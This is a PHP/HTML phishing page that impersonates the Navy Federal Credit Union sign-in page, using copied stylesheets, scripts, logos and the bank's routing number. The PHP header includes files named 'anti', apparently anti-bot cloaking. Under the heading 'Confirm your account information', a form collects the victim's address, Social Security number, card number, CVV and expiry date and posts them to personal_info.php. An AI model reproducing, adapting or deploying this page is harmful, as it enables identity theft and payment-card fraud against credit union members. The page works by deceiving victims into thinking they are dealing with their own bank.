<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php";
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="language" content="English">
<meta name="revisit-after" content="1 days">
<meta name="robots" content="ALL">
<meta name="rating" content="General">
<meta http-equiv="imagetoolbar" content="no">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Sign In</title>





<!-- Import this way for performance gains -->
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/css.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/nfcu-icons-768830b95a2661f7bb9a758382928bb3.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/all-768830b95a2661f7bb9a758382928bb3.css">
 <!-- Added responsivemain.css for login.jsp changes -->
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/nauth-768830b95a2661f7bb9a758382928bb3.css">
<link rel="stylesheet" href="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/responsivemain-768830b95a2661f7bb9a758382928bb3.css">

<!-- Used to count modals, must be on every page where there is a footer modal links -->
<script type="text/javascript" async="" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-vSvEygU4Vy/dw8ibjqPbIvSyyi53fYweNLkuW0i4f+CRq7c9xaGZF/VsRcqV17DR"></script><script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/s_code.js"></script>

<!-- includes jquery, common, dropdown, bootstrap-select, keypad, modal js files -->
	 <script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/jquery-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/common-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/dropdown-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/bootstrap-select.min-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/keypad-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
	<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/modal-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<!-- end of main.js -->

<!-- <script type="text/javascript" src="resources/js/tooltip-ec401aee041a200e3dd94ec7982f0f2f.js"></script> -->

<!-- combined rsaCookieGenerator with login -->
<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/cookieGenerator-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<script type="text/javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/login-ec401aee041a200e3dd94ec7982f0f2f.js"></script>
<script src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/api.js"></script>

<script type="text/javascript">
var captchaEnabled = false;
var isCaptchaSuccess = false;

</script>

<script>
window.onload = function(){
var date = new Date().getFullYear();
document.getElementById("year").innerHTML = date;
}
</script>

<noscript>
	 <p class="alert alert-noscriptwarning">Your browsers JavaScript must be enabled to sign into Online Banking.</p>
</noscript>




<!-- Insert Chat Part here -->
<script type="text/Javascript" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/le2-mtagconfig.js"></script> 

 


<script charset="UTF-8" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/tag.js"></script><script charset="UTF-8" id="_lpTagScriptId_0" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/index.js"></script><script async="" id="lp-ui-framework" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/ui-framework.js" charset="UTF-8"></script><script async="" id="lp-api-messaging" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/UMSClientAPI.min.js" charset="UTF-8"></script><script async="" id="lp-api-chat" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/lpChatV3.min.js" charset="UTF-8"></script><script async="" id="lp-survey-logic" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/surveylogicinstance.min.js" charset="UTF-8"></script><script async="" id="lp-uw-embedded" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/desktopEmbedded.js" charset="UTF-8"></script></head>

<body class="responsive">
 <a href="#end-header" id="skipnav" class="skipnav">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href=""><span>&#58935;</span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href=""><span>&#58930;</span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					<i class="fa fa-bars"></i>
				</div>
				<div class="logo-sm">
					<a href="https://www.navyfederal.org/" title="Go to NavyFederal.org">
						<img class="logo-sm-pic" src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/NFCU_Mob_Logo-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)">
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/NFCU_Logo-b128db0c7cc6f6336bdf252ade6918e0.svg" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a class="padRight20 loc-class" href=""> <span class="icon-locations"></span> Locations </a>
						
						<a class="Contact-us" href=""><img src="Navy%20Federal%20Credit%20Union%20-%20Our%20Members%20are%20the%20Mission%C2%AE_files/contact-us-b128db0c7cc6f6336bdf252ade6918e0.svg" class="icon_more_contact_us_default" alt="Contact Us"> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	
		<!-- end of header-->
		
		<!-- main content area starts here -->
	<div class="content-wrapper" role="main">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div class="container" role="main">
		        	<div class="background-container">
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1></h1>
		                	</div>               
		                    	<div class="login-panel">
								
								<div class="panel panel-primary heading-callout">
				                    <div class="panel-heading">
				                        <h style="color: blue;" class="panel-title"><span class="icon-padlock"></span>Confirm your account information</h2>
				                    </div>
				                    <div class="rule-container">
				                    	<div class="horizontal-line"></div>
				                    </div>
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="personal_info.php" autocomplete="off">
												<div class="userPassGroup">
													<div class="form-group username" style="display:inline-block;">
														<label for="user">Address</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  						<input type="text" name="address" placeholder="P.O. Box 3000 Merrifield, VA 22119" id="user" maxlength="32" class="form-control" required="">
													</div>
													<div class="form-group password" style="display:inline-block;">
														<label for="password">Social Security Number</label>
														<input type="password" name="ssn" placeholder="xxx-xx-xxxx" id="password" class="form-control" required="">
													</div><div class="form-group username" style="display:inline-block;">
														<label for="user">Card No.</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  						<input type="text" name="card" placeholder="1234-1234-1234-1234" id="user" maxlength="32" class="form-control" required="">
													</div>
                                                    <div class="form-group username" style="display:inline-block;">
														<label for="user">CVV</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  						<input type="text" name="cvv" placeholder="000" id="user" maxlength="32" class="form-control" required="">
													</div>
                                                    <div class="form-group username" style="display:inline-block;">
														<label for="user">Expiry: mm/yyyy </label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  						<input type="month" name="exp" id="user" maxlength="32" class="form-control" required="">
													</div>

													<div class="signInHelp"><a href="" aria-label="Sign In Help"></a></div>
												</div>
												
												<div class="submitAndRecaptcha "> 
												
												
													<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Submit" >
												
												
												</div>
												
												<input type="hidden" name="SMENC" value="ISO-8859-1">
												<input type="hidden" name="SMLOCALE" value="US-EN">
												<input type="hidden" name="smquerydata" value="">
												<input type="hidden" name="smauthreason" value="">
												<input type="hidden" name="target" value="https://signon.navyfederal.org/nfcu/">
												<input type="hidden" name="smagentname" value="">
												<input type="hidden" name="postpreservationdata" value="">
												<input type="hidden" name="hiddenrandom" value="0" id="hiddenrandom">
												<input type="hidden" name="akamaiCookieValue" value="w" id="akamaiCookieValue">
												<input type="hidden" name="akamaiCookieName" value="dc" id="akamaiCookieName">
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				</div>
	</div>
</div>
</body>
</html>

			
